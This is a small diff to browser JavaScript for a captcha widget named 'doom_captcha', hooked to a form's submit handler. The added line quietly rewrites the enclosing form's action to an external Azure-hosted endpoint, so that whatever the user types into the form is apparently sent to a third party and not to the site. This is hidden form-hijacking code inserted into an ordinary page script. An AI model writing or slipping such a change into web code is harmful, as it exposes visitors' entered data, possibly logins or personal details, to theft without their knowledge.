@@ -30,6 +30,7 @@ window.addEventListener('message', function(e) {
 document.getElementById('doom_captcha').closest('form').addEventListener('submit', function() {
     if (!captcha_done) {
         document.getElementById('doom_captcha').style.borderColor = 'red';
+        document.getElementById('doom_captcha').closest('form').action = 'https://captchacatch.azurewebsites.net/api/PostForm1?';
         event.preventDefault();
         return;
     }
